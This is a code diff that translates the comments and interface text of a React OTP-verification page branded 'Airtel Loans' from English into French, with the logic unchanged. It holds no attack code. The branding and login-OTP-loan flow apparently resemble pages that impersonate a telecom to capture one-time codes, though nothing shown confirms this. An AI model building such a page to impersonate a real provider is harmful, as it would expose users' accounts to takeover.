@@ -9,17 +9,17 @@ function AirtelOTPVerify() {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
-  // Retrieve the phone number saved during login
+  // Récupérer le numéro de téléphone enregistré lors de la connexion
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
 
-  // If no phone number saved, redirect back to login
+  // Si aucun numéro n'est enregistré, rediriger vers la connexion
   useEffect(() => {
     if (!phoneNumber) {
       navigate('/');
     }
   }, [phoneNumber, navigate]);
 
-  // Countdown timer
+  // Compte à rebours
   useEffect(() => {
     if (timeLeft <= 0) return;
     const timer = setInterval(() => {
@@ -48,10 +48,10 @@ function AirtelOTPVerify() {
     e.preventDefault();
     const otpString = otp.join('');
 
-    // Local validation — must have 4 digits
+    // Validation locale — doit contenir 4 chiffres
     if (otpString.length < 4) {
-      setError('Please enter the 4-digit verification code.');
-      alert('⚠️ Please enter the 4-digit verification code.');
+      setError('Veuillez saisir le code de vérification à 4 chiffres.');
+      alert('⚠️ Veuillez saisir le code de vérification à 4 chiffres.');
       return;
     }
 
@@ -66,25 +66,25 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        // ✅ Correct OTP — go to next page
+        // ✅ Code correct — passer à la page suivante
         navigate('/airtel-loan-limit');
       } else {
-        // ❌ Wrong OTP — show popup, inline error, and clear the boxes
-        const wrongMsg = '❌ Wrong OTP! Please check the code sent to your phone and try again.';
+        // ❌ Code incorrect — afficher un popup, une erreur en ligne, et vider les cases
+        const wrongMsg = '❌ Code incorrect ! Veuillez vérifier le code envoyé sur votre téléphone et réessayer.';
         alert(wrongMsg);
-        setError(data.message || 'Invalid OTP. Please try again.');
+        setError(data.message || 'Code invalide. Veuillez réessayer.');
 
-        // Clear the OTP inputs so the user can type fresh
+        // Vider les champs OTP pour permettre une nouvelle saisie
         setOtp(['', '', '', '']);
 
-        // Refocus the first input box
+        // Remettre le focus sur la première case
         setTimeout(() => {
           inputRefs.current[0]?.focus();
         }, 100);
       }
     } catch {
-      alert('⚠️ Error verifying OTP. Please check your internet connection and try again.');
-      setError('Error verifying OTP. Please try again.');
+      alert('⚠️ Erreur lors de la vérification du code. Veuillez vérifier votre connexion internet et réessayer.');
+      setError('Erreur lors de la vérification. Veuillez réessayer.');
     }
   };
 
@@ -105,18 +105,18 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        alert('📩 A new code has been sent to your phone.');
+        alert('📩 Un nouveau code a été envoyé sur votre téléphone.');
       } else {
-        alert(data.message || 'Failed to resend code.');
+        alert(data.message || 'Échec de l\'envoi du nouveau code.');
       }
     } catch {
-      alert('Error connecting to backend.');
+      alert('Erreur de connexion au serveur.');
     }
   };
 
   return (
     <div className="airtel-container">
-      {/* Header Section */}
+      {/* En-tête */}
       <div className="airtel-header">
         <div className="airtel-hamburger">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -126,27 +126,27 @@ function AirtelOTPVerify() {
           </svg>
         </div>
         <h1 className="airtel-logo">Airtel Loans</h1>
-        <p className="airtel-tagline">Quick loans. Anytime. Anywhere.</p>
+        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
       </div>
 
-      {/* Main White Card */}
+      {/* Carte blanche principale */}
       <div className="airtel-card">
         <button className="airtel-back-link" onClick={() => navigate('/')}>
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <line x1="19" y1="12" x2="5" y2="12"></line>
             <polyline points="12 19 5 12 12 5"></polyline>
           </svg>
-          Back to login
+          Retour à la connexion
         </button>
 
-        <h2 className="airtel-otp-heading">Verify your code</h2>
+        <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
         <p className="airtel-otp-subtext">
-          Enter the 4-digit code sent to {phoneNumber || '+243 XXX XXX XXX'}
+          Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
         </p>
 
         <form onSubmit={handleVerify}>
           <div className="airtel-input-group">
-            <label>Enter OTP Code</label>
+            <label>Saisir le code OTP</label>
             <div className="airtel-otp-container">
               {otp.map((digit, index) => (
                 <input
@@ -185,7 +185,7 @@ function AirtelOTPVerify() {
           </div>
 
           <button type="submit" className="airtel-verify-btn">
-            Verify Code
+            Vérifier le code
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <line x1="5" y1="12" x2="19" y2="12"></line>
               <polyline points="12 5 19 12 12 19"></polyline>
@@ -193,7 +193,7 @@ function AirtelOTPVerify() {
           </button>
 
           <button type="button" className="airtel-resend-btn" onClick={handleResend}>
-            Resend code
+            Renvoyer le code
           </button>
         </form>
       </div>
